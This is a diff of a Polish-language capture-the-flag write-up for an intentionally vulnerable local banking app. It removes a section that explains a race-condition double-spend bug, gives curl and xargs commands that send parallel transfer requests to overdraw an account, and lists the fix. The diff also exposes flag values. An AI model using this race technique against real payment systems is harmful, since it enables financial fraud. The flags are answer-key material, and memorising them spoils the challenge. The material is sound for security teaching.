@@ -353,43 +353,7 @@ def get_logs():
     logger.warning(f"Failed login for {email}")  # bez password!
 ```
 
-## A20 — Race Condition (Double Spend)
-**Flaga:** `PWR{race_condition_double_spend}`  
-**Trudność:** hard | **Punkty:** 200
 
-### Podatność
-Wyzwanie A20 eksponuje dedykowany endpoint `/api/challenges/a20/transfer-race`, który wykonuje check-then-act: najpierw sprawdza saldo, potem czeka (`sleep(0.55)`), a dopiero potem wykonuje atomowe `UPDATE` na kolumnie `balance`. Dzięki temu dwa równoległe requesty mogą oba przejść walidację i każdy odjąć środki, co łącznie może doprowadzić konto Boba poniżej zera.
-
-### Exploit (curl + xargs)
-
-1. Zaloguj się do banku jako Bob i zapisz token bankowy (`BANK_TOKEN`).
-
-```bash
-BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
-```
-
-2. Wyślij dwa równoległe requesty po `1500` PLN (przykład z `xargs`):
-
-```bash
-printf '%s
-' 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:5000/api/challenges/a20/transfer-race \
-  -H "Authorization: Bearer $BANK_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"to_iban":"PL00100100100100100100100100","amount":1500}' \
-  | jq -c .
-```
-
-Jedna z odpowiedzi powinna zawierać pole `flag` z wartością `PWR{race_condition_double_spend}` jeśli saldo Boba spadnie poniżej 0.
-
-### Naprawa
-- Przenieść check i update do jednej transakcji lub użyć `SELECT ... FOR UPDATE`.
-- Użyć atomowego `UPDATE accounts SET balance = balance - :amount WHERE id = :id AND balance >= :amount` i sprawdzać liczbę zmienionych wierszy.
-
-
----
 
 ## A10 — Exceptional Conditions (Stack Trace)
 **Flaga:** `PWR{stacktrace_db_url_leaked}`  
